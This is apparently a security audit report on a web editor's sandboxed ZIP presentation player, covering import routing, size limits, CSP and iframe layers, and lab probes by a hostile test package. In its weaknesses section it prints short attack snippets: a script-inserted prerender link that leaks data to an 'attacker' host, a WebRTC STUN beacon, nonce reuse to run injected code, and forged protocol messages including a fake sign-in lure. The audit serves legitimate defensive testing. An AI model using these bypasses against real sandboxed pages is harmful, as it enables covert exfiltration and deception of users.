# A1 - Audit of the presentation (ZIP player) pipeline against the owner's goal

Repo: `<repo>` at commit `974fa5e` (2026-11-22, "Add portable Slidev presentations with offline interactive playback (#1)"). Nothing in the repo was modified (`git status --short` is empty after all work).
Date of audit: 2026-11-24.

Labels used below: **[E]** verified-empirically (ran here), **[P]** verified-primary-source (code file:line, spec, vendor doc/bug), **[S]** secondary-source, **[I]** inferred, **[U]** uncertain.

## 0. Method, environment, how to re-run

- Node v22.23.5, Playwright 1.62.1. Two Chromium 158.0.8127.36 builds are installed and behave differently:
  - `chromium.launch()` -> **chrome-headless-shell** (`/opt/pw-browsers/chromium_headless_shell-1243`). Single renderer process: no site isolation, no out-of-process iframes, no NoStatePrefetch. This is also what the repo's own e2e test and CI use (`tests/browser/presentations.mjs:119`, `.github/workflows/check.yml:48-51`).
  - `chromium.launch({ channel: 'chromium' })` -> **full Chromium, new headless** (`/opt/pw-browsers/chromium-1234`). Real desktop process model (sandboxed frames are out-of-process). Results that depend on the process model, focus, or speculative loading were taken with this build and are marked "full Chromium".
- The production build `dist` was served read-only by a tiny static server of my own (it logs every request) on port 4400. Other ports: 4401 "attacker" HTTP server, 4402 raw TCP listener, 4403 UDP listener (STUN), 4404 HTTPS copy of the site (self-signed). All servers and browsers were closed; ports 4400-4409 are free.
- Hostile/edge packages were built in memory with fflate (valid `qft-presentation.json` + my own `presentation.html`) and fed through the real **Open file** input (`[data-file-input]`), i.e. the same path as a user.
- Everything is in `../prototypes/A1/`:

| Script | What it shows | Log |
| --- | --- | --- |
| `lib.cjs` | servers, package builder, dialog-state reader | - |
| `exp1-capability.cjs`, `exp1b-capability-extra.cjs` | capability map: 38 inputs through the real UI | `logs/exp1-capability.json`, `logs/exp1b-capability-extra.json` |
| `exp2-battery.cjs` (+ `hostile-battery.html`), `exp2b-battery-fullchromium.cjs` | ~75 hostile probes inside the player | `logs/exp2-battery.json`, `logs/exp2-battery-fullchromium.json` |
| `exp3-env.cjs` | secure context per frame level (http + https), fragment navigation | `logs/exp3-env.json` |
| `exp4-webrtc.cjs` | WebRTC vs CSP, `webrtc 'block'` directive | `logs/exp4-webrtc.json` |
| `exp5-kills.cjs` | 28 single-purpose packages (fragility, navigation, forged messages, sanitizer) | `logs/exp5-kills.json`, `logs/exp5-kills.txt` |
| `exp6-freeze.cjs` | infinite loop vs process model | `logs/exp6-freeze-chrome.json`, `logs/exp6-freeze-shell.json` |
| `exp7-reveal.cjs`, `exp7b-focus.cjs`, `exp7c-focusfix.cjs`, `exp7d-fkey.cjs` | hand-inlined Reveal.js 6.0.2 deck in the player; keyboard focus bug and repair | `logs/exp7*.json` |
| `exp8-packed-ordinary.cjs` | repo packer applied to an ordinary Slidev dist and to a Reveal project | `logs/exp8-packed-ordinary.json` |
| `exp9-platform.cjs` | WASM / workers / service worker under the editor CSP; SW into sandboxed frames | `logs/exp9-platform.json` |
| `exp10-perf.cjs` | timings at 1/8/20/24 MiB | `logs/exp10-perf.json` |
| `exp11-ux.cjs`, `exp12-hidden.cjs` | library/UX defects | `logs/exp11-ux.json`, `logs/exp12-hidden.json` |
| `exp13-flood-realm.cjs`, `exp13b-flood-input.cjs` | postMessage flood, fresh-realm access | `logs/exp13*.json` |
| `exp14-export.cjs` | hostile battery inside the standalone HTML export (file://) | `logs/exp14-export.json` |
| `exp15-prerender.cjs`, `exp15b-prerender-mitigation.cjs` | `<link rel=prerender>` network leak and (absent) declarative mitigations | `logs/exp15*.json` |
| `exp16-fidelity.cjs` | document-structure fidelity of the prepared document | `logs/exp16-fidelity.json` |
| `exp17-blobvfs.cjs`, `exp17b-blobvfs-child.cjs` | blob: URL virtual file system feasibility in the same frame topology | `logs/exp17*.json` |
| `exp18-headed.cjs` (run with `xvfb-run -a node ...`) | headed-window confirmation of the focus bug and the prerender request | `logs/exp18-headed.json` |

Run any of them with `cd <that dir> && node expN-....cjs` (they start and stop their own servers on 4400-4404). Screenshots: `shots/`.
The repo's own presentation unit tests pass here: `node --import tsx --test tests/presentation-*.test.ts` -> 40 pass, 0 fail **[E]** (Node 22; the repo pins Node 24).

Size of the feature in the build **[E]**: `PresentationLibrary...js` 28.5 KB (library + runtime), `presentation-package...js` 9.2 KB, `presentation-store...js` 4.1 KB. The site already ships reveal.js (118 KB chunk) for its Markdown slide mode.

---

## 1. Capability map

### 1.1 Routing (code path)

1. `src/scripts/markdown-workspace.ts:1372-1393 openFile(file)`: name must match `/\.zip$/i` -> `flush()` -> `PresentationLibrary.tryOpenFile(file)` (`src/scripts/presentation-library.ts:225-257`). If that returns `false` -> `importWorkspaceBundle(file)` (lesson/Markdown ZIP, `src/lib/document-bundle.ts:266`). Non-ZIP: only `.md/.markdown/.txt`. Entry points: Open file button (`:1923-1929`), drag and drop (`:2137-2149`, one file), and the library's own picker (`presentation-library.ts:66-73`).
2. `tryOpenFile` -> `inspectPresentationArchive(file)` (`src/lib/presentation-package.ts:308-380`):
   - size 0 or > 60 MiB -> throw (`:309-311`), **before** the format is known.
   - `inspectDirectory(bytes, false)` (`:97-201`): structural validation that applies to **every** ZIP (also Markdown/lesson ZIPs).
   - no `qft-presentation.json` at any depth (`:317-331`): any `qft.json` -> `null` (lesson importer); `sourceOnly()` (`:291-301`) -> throw; `index.html?` + any `.js/.mjs` + no `.md/.markdown` -> throw "website build"; otherwise `null`.
   - manifest present: strict re-validation (`:332`), exactly one manifest, <= 32 KiB, every file under the manifest's folder, `parseManifest` (`:250-284`), entry exists, <= 24 MiB, valid UTF-8, contains `<html` and `<body` (`:350`), declared source exists; text previews (<= 2 MiB each, 8 MiB total, entry excluded `:362`); CRC verification of all remaining entries (`:373`).
3. `showPackage()` (`presentation-library.ts:259-301`) creates an inert player (`createPresentationPlayer`, `src/lib/presentation-runtime.ts:221-295`), then `savePresentation()` stores the original ZIP (`src/lib/presentation-store.ts:142-158`).
4. Only **Start/Present** runs `preparePresentationDocument()` (`presentation-runtime.ts:158-218`, called at `:252`). A package can therefore be accepted and saved and still be unplayable.

### 1.2 What plays **[E]** (`exp1`, `exp7`)

| Input | Result |
| --- | --- |
| `qft-presentation` v1 ZIP from `tools/slidev/pack.mjs` (shipped example, 1,674,968 B, 14 files) | Dialog opens, "Saved in this browser...", Start -> "Playing locally" |
| Any single self-contained HTML wrapped in a manifest that claims `"engine":"slidev"` - plain HTML+JS (562 B) | Plays (ready ~245 ms) |
| Hand-inlined **Reveal.js 6.0.2** deck (reset.css + reveal.css + theme/black.css + reveal.js + notes plugin inlined; 817,864 B HTML, 508 KB ZIP), manifest `engine:"slidev"` | **Plays**, ready 376 ms; arrows, fragments, internal slide link, overview, canvas animation, button handlers work. The player is engine-agnostic; only the manifest constant and labels are Slidev-specific |
| (Other subsystem) Markdown `---` slides and lesson ZIPs (`qft.json`) | Handled by the workspace/Reveal renderer, not by this player (limits: 30 MiB, 150 entries, `document-bundle.ts:12-14`, `lesson-project.ts:13-15`) |

### 1.3 Rejected at import - exact text **[E]** unless marked [P]

Shown as a workspace toast for 12 s (`markdown-workspace.ts:816`) or in the library notice.

| Input | Exact text | Where |
| --- | --- | --- |
| Standard multi-file Reveal.js ZIP (`index.html` + `dist/reveal.js` + css + `dist/plugin/notes.js` + assets), at root or in one folder | "This is a website build ZIP. Follow tools/slidev/README.md and use the QFT Slidev packaging tool to bundle its scripts, fonts, and assets for local playback." | `presentation-package.ts:325-329` |
| Ordinary `slidev build` dist (root, or under `dist/`) | same text | same |
| Slidev source (`slides.md` + `package.json` with `@slidev/cli`) | "This ZIP contains Slidev source, not a playable presentation. Ask the AI to build it with the QFT Slidev packaging tool, following tools/slidev/README.md, and include the compiled presentation." | `:322-324`, `sourceOnly` `:291-301` |
| Slidev **source + dist in one ZIP** | same "contains Slidev source" text (the build inside is ignored) | same |
| Plain Markdown ZIP that merely contains `slides.md` and any `.vue` file | same "contains Slidev source" text (false positive) | `:299-300` |
| Manifest `engine:"reveal"` or `version:2` | "This presentation package version is not supported. Use the current Slidev packaging tool." | `:258-260` |
| Manifest entry missing in ZIP | "The playable HTML file is missing: index.html" | `:346` |
| Entry without `<html`/`<body` tags | "The entry file must be a complete, built HTML presentation." | `:350-352` |
| File outside the manifest's folder | "The ZIP contains files outside its presentation folder." | `:339-341` |
| Two manifests | "Choose a ZIP containing one presentation package." | `:333` |
| `source` not `.md/.markdown` (e.g. `source/index.html`) | "The presentation source must point to a Markdown file." | `:267-270` |
| `aspectRatio:"16:10"` | "The supported presentation sizes are 16:9 and 4:3." | `:271-273` |
| Title of 201 chars | "The presentation needs a title of 1–200 characters." | `:261-263` |
| Path containing `%` (`source/100%.md`), or `\` | "This presentation ZIP could not be opened. An archive path is invalid: source/100%.md" | `:66-72`, `:146` |
| Non-UTF-8 file name without the UTF-8 flag (legacy Windows tools) | "This presentation ZIP could not be opened. Use UTF-8 filenames when creating the ZIP." | `:84-90` |
| Entry HTML in UTF-16 | "The file \"presentation.html\" must contain valid UTF-8 text." | `:79-82` |
| Entry HTML of 24 MiB + 1 byte | "The playable HTML file exceeds 24 MB." (118 ms) | `:347` |
| ZIP of 60 MiB + 1 byte | "Choose a presentation ZIP smaller than 60 MB." | `:309-311` |
| Text file renamed `.zip` | "This presentation ZIP could not be opened. Its directory is missing or incomplete." | `:108` |
| ZIP with 1001 entries (any kind) | "This presentation ZIP could not be opened. Keep the package below 1,000 files and folders." | `:117` |
| Bare `index.html` (not zipped) | "Choose Markdown (.md), plain text (.txt), a lesson ZIP, or a prepared Slidev presentation ZIP." | `markdown-workspace.ts:1387` |

Other messages present in code, not individually triggered **[P]** (all `invalidZip` ones are prefixed "This presentation ZIP could not be opened. "): "Choose a valid ZIP archive." (`:99`), "Multi-volume ZIPs are not supported." (`:113`), "ZIP64 archives are not supported. Use an ordinary ZIP." (`:115`), "Its directory boundaries are invalid." (`:118`), "Its file directory is invalid." (`:126`), "A filename is missing or incomplete." (`:141`), "The ZIP contains duplicate or ambiguous paths: <name>" (`:148`), "Encrypted ZIP files are not supported." (`:150`), "ZIP64 and multi-volume entries are not supported." (`:152`), "Symbolic links are not supported." (`:154`), "Use standard ZIP compression." (`:155`, methods other than store/deflate), "An expanded file exceeds 40 MB." (`:156`), "The expanded package exceeds 120 MB." (`:158`), "An entry has an excessive expansion ratio." (`:160`), "A folder contains unexpected data." (`:162`), "A local file record is missing." (`:164`), "A file does not match its directory record." (`:175`), "A file has inconsistent size or checksum metadata." (`:180`), "An uncompressed file has an invalid size." (`:182`), "Unexpected data in its file directory." (`:187`), "File records overlap." (`:190`), "A path is used both as a file and as a folder." (`:196`); "The ZIP contains a damaged file: <name>" (`:238`, `:241`); "The presentation manifest is not valid JSON." (`:253`), "The presentation manifest must be an object." (`:255`), "The presentation manifest needs a valid HTML entry file." (`:265`), "The presentation generator metadata is invalid." (`:275`), "The presentation manifest exceeds 32 KB." (`:336`), "The declared source file is missing: <path>" (`:354`).

### 1.4 Silently mis-routed to the Markdown/lesson importer **[E]**

| Input | What the user gets |
| --- | --- |
| Same multi-file Reveal.js ZIP **plus a `README.md`** (very common in AI output) | A new *Markdown document containing the README* opens; toast "Lesson opened. Check lesson helps you spot missing images, equations, or demo dependencies." No hint that it was a presentation. (`presentation-package.ts:327` requires "no .md" -> returns `null` -> `markdown-workspace.ts:1377-1384`) |
| Reveal ZIP with two `.md` files; ZIP holding only `index.html` (CDN-based single-file deck, no `.js` file in the ZIP); empty ZIP | "A ZIP bundle must contain one Markdown document, or a QFT document manifest." (`document-bundle.ts:310`) |
| ZIP with only a Slidev `slides.md` (no `package.json`, no `.vue`) | Opens as a Markdown document starting with the raw `---\ntheme: default...` front matter |
| ZIP with `qft.json` (here `{}`) + `index.html` + `app.js` | "This document bundle format is not supported." (`document-bundle.ts:244`) |
| Library dialog's own "Open presentation ZIP" picker, given any non-presentation ZIP (e.g. a Reveal site with a README) | "This is a Markdown lesson ZIP. Close this panel and use Open file in the workspace to edit it." (`presentation-library.ts:71`) - wrong for anything that is not a lesson |

### 1.5 Accepted **and saved**, then fails only at Start **[E]**

State becomes "Playback needs attention", frame count 0, text shown in the dialog notice. The record is already in IndexedDB (`qft-presentations`).

| Entry HTML contains | Exact text | Where |
| --- | --- | --- |
| `<script src="dist/reveal.js">` (files present in the ZIP) or CDN `<script src="https://...">` | "This presentation has separate JavaScript files. Create a portable ZIP with the Slidev packaging tool before opening it." | `presentation-runtime.ts:164-166` |
| `<link rel="stylesheet" href>` (when no `script[src]`) | "This presentation has separate stylesheets. Create a portable ZIP with the Slidev packaging tool before opening it." [P] | `:167-169` |
| `<iframe>` / frame / object / embed / portal | "Embedded websites are not supported in an offline Slidev package. Include the demonstration directly in the presentation." | `:170-172` |
| `<script type="importmap">` | "This presentation still needs JavaScript imports. Rebuild it with the portable Slidev packaging tool." [P] | `:173` |
| `<img src="assets/logo.svg">` (file present in the ZIP), or any `src/href/xlink:href/poster/background/data` that is not `#...` or `data:image|audio|video|font...` | "This presentation references an asset outside its HTML. Rebuild the portable package with its pictures, fonts, and media included." | `:182-190` |
| HTML > 24 Mi UTF-16 units; prepared > 26 Mi | "The presentation HTML must be smaller than 24 MB." / "The presentation is too large after preparing it for playback. Reduce its embedded assets or split the deck, then rebuild the portable ZIP." [P] | `:159`, `:216` |

### 1.6 Runtime terminations (the frame is removed) **[E]** (`exp5`, `exp6`, `exp7`)

| Trigger | Notice |
| --- | --- |
| Any uncaught error (also inside a click handler, 1 s or 10 min after start) | the error message, e.g. "Uncaught Error: benign late error in an animation callback" (`:127-128`) |
| Any unhandled promise rejection | reason text, e.g. "optional analytics module failed" (`:131`) |
| Any element `error` event that reaches `window` (one corrupt `data:` image is enough; Reveal `data-src="images/chart.png"` lazy image) | "A presentation resource could not be loaded. Rebuild the package with all assets included." (`:129`) |
| Any CSP violation in the deck (`@import` of a web font, `@font-face url(https...)`, runtime `<img src=http...>`) | "This presentation requested an unsupported resource (style-src-elem\|font-src\|img-src\|...). Rebuild it with the portable Slidev packaging tool." (`:132-134`) |
| Own-frame navigation to http(s) (script, or dynamic `<meta refresh>`) | "The presentation attempted an unsupported navigation or resource (frame-src). Use a fully bundled offline presentation." (`:74-76`) |
| No `ready` within 20 s (e.g. infinite loop during load) | "The presentation has not finished loading. Try Restart, or rebuild it with the portable Slidev packaging tool." (measured 20,143 ms, full Chromium) (`:270-272`) |
| Reveal.js key **F** (its own fullscreen) | "Disallowed by permissions policy" (unhandled rejection of `requestFullscreen`) |
| Reveal.js key **S** (speaker notes) | "Uncaught TypeError: Cannot set properties of null (setting 'marked')" (`window.open` returns null in the sandbox) |
| Ordinary Slidev dist after bundling (default `routerMode: history`) | "Failed to execute 'replace' on 'Location': '' is not a valid URL." (preceded by `SecurityError ... replaceState ... origin 'null'`) |

Not fatal (silent): `console.error`; relative CSS `url(images/bg.png)` (unresolvable against a blob: base, no request, no error); `fetch('./data.json')` when the deck catches the rejection.

---

## 2. Limits

| Limit | Value | Enforced at |
| --- | --- | --- |
| ZIP size | 60 MiB (`archiveBytes`) | `presentation-package.ts:6`, `:309`; `presentation-store.ts:90`, `:143`; `tools/slidev/pack.mjs:280` |
| Expanded total (central-directory sizes) | 120 MiB | `presentation-package.ts:7`, `:158`; `pack.mjs:15`, `:244` |
| Entry HTML | 24 MiB (bytes) at import; 24 Mi UTF-16 units at prepare/export; 26 Mi units for the prepared message | `presentation-package.ts:8`, `:347`; `presentation-runtime.ts:159`, `:325`, `:216`, runner `:60` |
| Any single file | 40 MiB | `presentation-package.ts:9`, `:156`; `pack.mjs:14`, `:97`, `:243` |
| Entries (files + folders) | 1,000 | `presentation-package.ts:10`, `:117`; `pack.mjs:16` |
| Manifest | 32 KiB; title 1-200 chars, no control chars; generator <= 200 | `:11`, `:335`; `:261`; `:274` |
| Source preview | 2 MiB per file, 8 MiB total; extension allowlist `isTextPath` | `:12-13`, `:286-289`, `:356-367` |
| Path | <= 1024 chars; no `\ : ? # %`, control chars, leading `/`, empty/`.`/`..` segments, segments ending in `.` or space; NFC+lowercase duplicates rejected | `:66-72`, `:146-148` (packer: 400 chars, `pack.mjs:49`) |
| Expansion ratio | entry > 1 MiB and ratio > 1000 rejected | `:159` |
| `package.json` sniff for Slidev | files <= 256 KiB | `:293` |
| Stored file name / slug | 240 chars / 90 chars | `:377`, `presentation-store.ts:89`; `presentation-library.ts:22` |
| Ready timeout | 20,000 ms | `presentation-runtime.ts:270-272` |
| Ready signal | `load` + 2 animation frames | `:147-151` |
| Error detail / number reported | 350 chars / 3 | `:48`, `:99`, `:244` |
| Token / nonce | 36 hex chars (18 random bytes) / 16-128 chars | `:230`, `:59`, `:82`, `:160` |
| In-memory Web Storage shim | 1,000,000 UTF-16 units | `:104-125` (`:116`) |
| Unsaved ("temporary") packages when IndexedDB fails | 5 packages / 120 MiB | `presentation-library.ts:245` |
| Example download timeout; object-URL lifetime | 30 s; 30 s | `presentation-library.ts:375`; `:18` |
| Lesson/Markdown ZIP (other importer) | 30 MiB, 150 entries, 2 MiB per text file, 8 MiB per image, 400,000 chars | `document-bundle.ts:12-14`, `:277-288`; `lesson-project.ts:13-15` |

Measured cost on this machine, full Chromium **[E]** (`exp10`; decks padded with incompressible base64):

| HTML size | ZIP | import (file -> deck shown) | Start -> ready | HTML export | reopen from library |
| --- | --- | --- | --- | --- | --- |
| 1 MiB | 0.8 MB | 259 ms | 251 ms | 100 ms | 173 ms |
| 8 MiB | 6.4 MB | 841 ms | 675 ms | 184 ms | 724 ms |
| 20 MiB | 16.1 MB | 1,691 ms | 1,375 ms | 382 ms | 1,728 ms |
| 24 MiB (limit) | 19.3 MB | 2,089 ms | 1,761 ms | 489 ms | 2,142 ms |

All validation/CRC work is synchronous on the main thread. The 20 s timeout has an 11x margin at the size limit here. Because assets must be base64-inlined into the one HTML, the 24 MiB HTML cap means roughly 18 MB of real media per deck, although the ZIP may be 60 MiB.

---

## 3. Security model as implemented

### 3.1 Layers **[P]**

| # | Layer | Where | What it protects |
| --- | --- | --- | --- |
| 0 | Import is inert: parsing never executes code; source is shown in a `<textarea>`; an iframe exists only after Start | `presentation-package.ts:3`; `presentation-runtime.ts:220`; `PresentationLibrary.astro:52` | Opening or browsing a package cannot run it ([E]: 0 frames before Start) |
| 1 | ZIP validation before allocation: central directory first, local/central agreement, overlap check, CRC of every entry, streaming inflate bounded by declared size, no ZIP64/encryption/symlinks/multi-volume | `presentation-package.ts:97-244` | Memory/CPU bombs, path tricks, ambiguous or dishonest archives |
| 2 | Editor page CSP (meta): `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; font-src 'self' data:; connect-src 'self' https: blob:; worker-src 'self' blob:; frame-src 'self'; object-src 'none'; base-uri 'self'; form-action 'none'` | `src/layouts/BaseLayout.astro:20-32` | Package markup can never execute in the editor document; frames only from the site |
| 3 | Outer iframe `sandbox="allow-scripts"` -> `/presentation-sandbox.html` ("runner"), `referrerpolicy="no-referrer"`, `allow="camera 'none'; microphone 'none'; geolocation 'none'; clipboard-read 'none'; clipboard-write 'none'; payment 'none'; usb 'none'; serial 'none'; fullscreen 'none'"` | `presentation-runtime.ts:254-268` | Opaque origin: no editor DOM, IndexedDB, localStorage, cookies; no popups, top navigation, forms, modals, downloads, pointer lock |
| 4 | Runner: refuses to run unless embedded and `origin === 'null'`; accepts one `qft-presentation-load` from its parent (36-hex token, HTML <= 26 Mi units); relays only `ready` / `escape` / `error` (<= 350 chars) from its own child with the token | `:35-78`; `public/presentation-sandbox.html` | Runner cannot be used top-level or reloaded with other content; narrow message surface |
| 5 | Runner CSP (2 metas): `default-src 'none'; script-src 'unsafe-inline'; script-src-attr 'none'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; frame-src blob:; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'` + `script-src 'unsafe-inline'; script-src-attr 'none'` | `:81-90` | No network for the runner; its child may only be navigated to blob: URLs |
| 6 | Inner iframe `sandbox="allow-scripts"` with a `blob:` URL created by the runner -> a second, different opaque origin | `:63-72` | The package cannot touch the runner (relay logic) |
| 7 | Prepared document's own CSP (2 metas, added to the inherited runner policy): `default-src 'none'; script-src 'nonce-<run>'; script-src-attr 'none'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; frame-src 'none'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'` + `script-src 'unsafe-inline'; script-src-attr 'none'` | `:193-196`, `:212` | Inline, nonce-stamped scripts only; no external script even with nonce; no eval, WASM, workers, frames, fetch, external img/font/css |
| 8 | Preparation in an inert `<template>` in the editor: throws on `script[src]`, stylesheet links, iframes/objects, import maps, external asset attributes; removes `base, meta, link, title`, `on*` attributes, `nonce, srcdoc, srcset, ping, action, formaction, target, download, autofocus`; removes `href` of non-`#` links; stamps the nonce on every script | `:158-192` | Supplied metadata cannot weaken the policy; early, readable failures. It is a compatibility linter, not an enforcement layer (see W9) |
| 9 | Bootstrap injected as first script: in-memory Web Storage shim; reports errors/rejections/CSP violations (host then destroys the frame); relays Escape; cancels clicks on non-`#` links and all form submits; `ready` after load + 2 rAF | `:93-152` | UX and fail-closed behaviour; not tamper-proof (W3) |
| 10 | Host player: `event.source === frame.contentWindow` and token on every message; destroys the frame on Stop, Restart, error, timeout, dialog close | `:221-295`; `presentation-library.ts:74-84` | Stale or foreign frames cannot drive the UI; code stops when the user stops it |
| 11 | Separate IndexedDB database `qft-presentations` (path-scoped name), original ZIP bytes only, re-validated on every reopen | `presentation-store.ts:20-22`, `presentation-library.ts:213-221` | Package code never stored with drafts; nothing trusted from storage |
| 12 | Standalone HTML export: same runtime serialized; outer page CSP `script-src 'nonce-N'` (+ inline-only), `frame-src 'self' blob:`; runner as sandboxed `srcdoc`; inert until Start | `:324-331` | Same containment offline |

### 3.2 What a hostile package could and could not do **[E]**

One package ran ~75 probes (`exp2`; full Chromium rerun `exp2b`). The draft typed into the editor stayed intact; host saw no dialogs, popups, downloads or top-level navigations.

**Blocked** (attacker HTTP server on 4401 received nothing for any of these):

| Area | Probe -> observed |
| --- | --- |
| Network | `fetch` (cors/no-cors, also to the site itself), XHR, `sendBeacon` (returns true, never sent), WebSocket, EventSource, detached `Image`, CSS `@import` / `background:url()` / `@font-face`, `<link rel=stylesheet|prefetch|preload|modulepreload>`, external `<script src>` **even with the correct nonce**, `<object>`/`<embed>` -> all refused by CSP (`connect-src`, `img-src`, `style-src-elem`, `font-src`, `default-src`, `script-src-elem`, `object-src`) |
| Code loading | `eval`, `new Function`, string `setTimeout`, inline script without nonce, `import('data:...')`, `import(blobUrl)`, `WebAssembly.instantiate` ("violates ... 'unsafe-eval'"), blob Worker, SharedWorker ("denied to origin 'null'"), service worker (`navigator.serviceWorker` throws/undefined) |
| Frames | iframes with `srcdoc`, `blob:`, `data:`, `http:` -> `frame-src` violation |
| Popups / navigation | `window.open` -> `null`; detached `<a target=_blank>.click()` -> "Blocked opening ... 'allow-popups' permission is not set"; `top.location = ...` and `top.location.replace()` -> `SecurityError`; form submit -> blocked (`allow-forms`); `<a download>` -> nothing downloaded |
| Own-frame navigation to http(s) or to the site's own origin | blocked by the runner's `frame-src blob:`; host shows "...unsupported navigation or resource (frame-src)..." and removes the frame |
| Navigating the runner frame (`parent.location.replace(...)`, attacker URL or same-origin URL) | `SecurityError: ... does not have permission to navigate the target frame` (Chromium 158). Note: the HTML Standard's "allowed by sandboxing to navigate" returns true when the target is a non-top ancestor (https://html.spec.whatwg.org/multipage/browsing-the-web.html#allowed-to-navigate) [P]; other engines untested [U]. If an engine allowed it, the editor's `frame-src 'self'` would still limit the target to same-origin URLs |
| Editor data | native `localStorage` -> `SecurityError` (the bootstrap supplies a memory shim); `indexedDB.open('qft-markdown')` and `indexedDB.databases()` -> `SecurityError`; `document.cookie` -> `SecurityError`; Cache Storage -> `SecurityError`; `top.document`, `parent.document`, `top.location.href` -> `SecurityError`; `frameElement` -> `null`; `BroadcastChannel('qft-markdown')` receives nothing. Only `top.length` (=1) is readable |
| UI abuse | `alert/confirm/prompt/print` return immediately ("Ignored call ... 'allow-modals'"); `requestFullscreen` rejected; pointer lock rejected; forged message posted straight to `top` ignored |

**Not blocked - demonstrated weaknesses and inconsistencies:**

**W1. `<link rel="prerender">` makes a real HTTP GET to an arbitrary URL.** Full Chromium 158, hosted player, ordinary prepared document (`exp15`). One line of package script - `l=document.createElement('link'); l.rel='prerender'; l.href='http://attacker/?leak='+data; document.head.append(l)` - and the attacker server received
`GET /prerender?leak=SECRET-speculative%20loading%20probe` with `Sec-Purpose: prefetch`, `Sec-Fetch-Dest: document`, `Sec-Fetch-Site: cross-site`, no Referer/Origin/Cookie. Host stayed "Playing locally"; **zero** CSP violation events. Same from the standalone export opened from `file://` (`exp14`). No declarative switch stops it (`exp15b`, top-level control pages): `default-src 'none'` as meta or header, `frame-src/child-src 'none'`, header `sandbox allow-scripts` all still fetch; `prefetch-src` and `navigate-to` are "Unrecognized Content-Security-Policy directive". Static `<link>` elements in the package are removed by the preparer, so only script-inserted ones leak. Not seen in chrome-headless-shell (which is what CI uses). Speculation rules (static or dynamic) produced no request.

**W2. WebRTC reaches the network.** `new RTCPeerConnection({iceServers:[{urls:'stun:<host>:4403'}]})` + `createDataChannel` + `setLocalDescription` inside the player -> my UDP listener received 8 STUN Binding Requests (20 bytes, `0001 0000 2112a442...`) on both `127.0.0.1` and the container's `192.0.2.2`, in both Chromium builds and in the export (`exp2`, `exp2b`, `exp14`). CSP `connect-src 'none'` does not apply. The CSP `webrtc 'block'` directive is not implemented: Chromium 158 logs "Unrecognized Content-Security-Policy directive 'webrtc'." and still sends (`exp4`) [E]; Firefox bug 1783489 "Implement CSP 'webrtc' directive" is NEW/unassigned (https://bugzilla.mozilla.org/show_bug.cgi?id=1783489) [P]; WebKit bug 255651 is NEW (https://bugs.webkit.org/show_bug.cgi?id=255651) [P]. Local IPs are hidden (`*.local` mDNS candidate).

Consequence of W1+W2: the statements "No uploads. Playback has no external connections." (`presentation-library.ts:140`), README "no access to editor drafts, network services, ... or dynamic code evaluation" (`README.md:135-137`) and the packaged `README.txt` ("deliberately blocks network requests", `pack.mjs:275`) hold for ordinary code but not against a deliberately hostile package in Chromium. What does hold in every probe: the package cannot read or change anything belonging to the editor.

**W3. The fail-closed reporting is advisory.** The package can read both secrets of its run: `document.currentScript.nonce` and the message token (it is a literal inside the bootstrap script text, `document.scripts[0].textContent`). It can (a) mute violation reports with `window.addEventListener('securitypolicyviolation', e => e.stopImmediatePropagation(), true)` (window capture runs before the bootstrap's document listener) - used in `exp5`/`exp15`, host stays "Playing locally" while violations occur; (b) replace itself with a bootstrap-free document: `location.replace(URL.createObjectURL(new Blob([html with nonce="<same nonce>"])))` is allowed by the runner's `frame-src blob:`, the new document inherits the CSP, and it forges `parent.postMessage({qftPresentation:1, token, kind:'ready'})`. The whole battery in `exp2` ran that way with the host showing "Playing locally" throughout. (Such a second-generation blob document is not a secure context: `isSecureContext=false`.)

**W4. "No dynamic code evaluation" is not a boundary.** `eval`/`Function` are blocked, but `s=document.createElement('script'); s.nonce=document.currentScript.nonce; s.textContent=code; document.head.append(s)` runs (`ran=42`). The missing `'unsafe-eval'`/`'wasm-unsafe-eval'` therefore only costs compatibility (libraries that need `new Function` or WebAssembly).

**W5. Forged protocol messages.** With the token the package can send `{kind:'error', detail:<any 350 chars>}`: the host removes the frame and prints the text in its own notice area, e.g. "Your session expired. To restore your drafts, sign in again at https://qft-login.example/restore" (`exp5` `forged-error-text`, screenshot `shots/exp5-forged-error-text.png`). Text only (`textContent`), not clickable. `kind:'escape'` exits host fullscreen at will; early `ready` is accepted.

**W6. CPU.** `for(;;){}` after ready (`exp6`):
- full Chromium: the runner and the blob child are separate out-of-process frames (CDP targets `iframe .../presentation-sandbox.html` and `iframe blob:null/...`, 4 renderers). Editor stays responsive (rAF 0 ms), **Stop works in 43 ms**. Loop during load: host timeout fires at 20,143 ms and removes the frame. Even with `--disable-features=IsolateSandboxedIframes` the blob child stays out-of-process and Stop works (35 ms).
- chrome-headless-shell (one renderer, as a stand-in for engines without this isolation): editor frozen - `page.evaluate` and rAF get no answer in 4 s, Stop cannot be clicked, and the 20 s timeout never fires because it shares the blocked thread. With `--site-per-process` it behaves like full Chromium.
- Where this applies in the field: desktop Chromium isolates sandboxed frames "since 127.0.6483.0"; on Android only if the embedding site uses partial site isolation (chromium `docs/process_model_and_site_isolation.md`, https://raw.githubusercontent.com/chromium/chromium/main/docs/process_model_and_site_isolation.md) [P] -> md.qft.org on Android Chrome is likely same-process [I]. Firefox: bug 961689 "Process-isolated sandboxed iframes" is still NEW, Fission milestone "Future" (https://bugzilla.mozilla.org/show_bug.cgi?id=961689) [P] -> a looping deck freezes the tab there [I]. Safari: site isolation was still not confirmed as default in 2026 bug-tracker results [S][U].

**W7. postMessage flood.** A package posting ~130,000 messages/s (361,839 in 2.8 s) to `top` or through the relay (`exp13`, `exp13b`, full Chromium): host 100 ms timers fire a median 1.2 s late (max 2.5 s), frame time 0 -> 99 ms; a real pointer click on Stop is dispatched in 605 ms and the frame is gone 3.7 s later. Degraded, recoverable. No rate limit exists in the listener (`presentation-runtime.ts:275-285`).

**W8. History.** `history.pushState` inside the deck adds entries to the tab's joint session history: host `history.length` 2 -> 7 after 5 pushes (`exp5`); a blocked self-navigation adds one too. Back then steps through dead deck states.

